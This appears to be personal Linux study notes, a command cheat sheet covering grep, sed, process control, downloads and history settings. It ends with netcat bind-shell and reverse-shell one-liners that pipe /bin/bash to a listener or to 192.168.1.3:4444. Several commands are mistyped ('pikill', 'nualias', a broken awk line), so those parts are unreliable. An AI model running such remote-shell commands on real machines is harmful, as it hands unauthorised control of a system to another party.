#### commands info
man ls 			    # manual and all "ls" info
whatis ls 		    # quit description for what is ls 
apropos list        		# search what tool to do this function
whoami
sudo adduser mohamed 		# add user
usermod -aG sudo mohamed 	# add sudo user
shasum  file 				# see file hashing

pkg -i  '***' 				# install package
apt remove 'pkg'				# remove programe package
apt remove --purge 'pkg' 		# remove package configiration

# search
locate rockyou.txt
find . -name data.txt -type f -size 33c -user boyka -executable -exec file +{} | grep "boyka"

# '<' 0 STDIN '>' 1 STDOUT '2>' STDERR
echo "boyka" > boyka.txt        # >> for write on newline
cat boyka.txt | tee nex.txt     # write with printing on screen
cat < boyka.txt
rm * 2> /dev/null
ls | xargs rm 					# == rm *

# get regular expression 'grep' 
grep "text" file.txt === cat file.txt | grep "text"      #search for text in file.txt
grep -i -v text file.txt                                 # -i ignore lower and upper and find all match -v print the opposite
grep t..t file.txt   			# search by regex
grep te* file.txt 

# stream editor
sed 's/boyka/mohamed/' file.txt > new  # s for substitute boyka/mohamed
sed 's/boyka/mohamed/g' file.txt > new # g for global ..means all words match in the line

# split for divide file data in subfiles
split -l 100 file new_             # this will split every 100 line in 'file' into separate file new_aa new_ab new_ac ...

head file						# print first 10 lines by defult 
tail file						# last 10 by defult 
-f 								# for follow and print any changing

# cut and replace by delimeter
cut -d " " -f 2 file            # -d for delimeter '\t' by defult -f for field -b for byte

# awk options 'selection _criteria {action }' input-file > output-file
cut -d ":" file |awk {print $1,$2} # = cut -d ":" -f 1,2

# comparing files
comm file1 file2
comm -1 file1 file2            #show without column 1 
----------------
diff file1 file2               #this command compares line by line with more options

# process management
ps aux 						    # process manager
sleep 1000& 				    # & for run in background
nohup sleep 1000& 				# 'no hang up' active if bash session closed
jobs 							# show shell jobs
fg 								# show a job for ground
bg 								# move a job in background
disown                       	# for make a process nohup
kill id                         # kill process -1 for kil with hup signal -2 for iterrupt -9 aggressive killing 
killall sleep 					# kill all sleep processes
pikill sle 						# will all begins with sle

# follow and watch process or file changing
watch free 						# free shows memory usage and watch follows changing
watch -n 0.5 -d free 			# watch every 0.5 second and -d for highlight the diffrence
watch -n 0.5 -d df 				# disk format 

# downloading files
wget url
curl url -o name
axel							# better for large files -n provide multi connections
git clone 						# for github

# Bash History Customization
export HISTIGNORE="&:ls:[bf]g:exit:history"  	#ignore saving commands in history
.bashrc  										#.bashrc script is executed any time that user logs in
alias l="ls -lah"								# Aliases are useful for replacing commonly-used commands and switches with a shorter command
nualias  l

# net cat for connecting and transfering data via tcp/udp
#  -n option to disable DNS name resolution, -l to create a listener, -v to add some verbosity, and -p to specify the listening port number
nc -vnp 192.168.1.3 4444 		# connect server ip and port
nc -nlvp 4444 					# server listen on port 4444 
nc -vnp 192.168.1.3 4444 < data.txt #sending file
nc -nlvp 4444 > new 				#receiving data 
# Netcat Bind Shell Scenario
nc -nlvp 4444 -e /bin/bash 		#-e option works on kali nc
# Reverse Shell Scenario
nc -vnp 192.168.1.3 4444 -e /bin/bash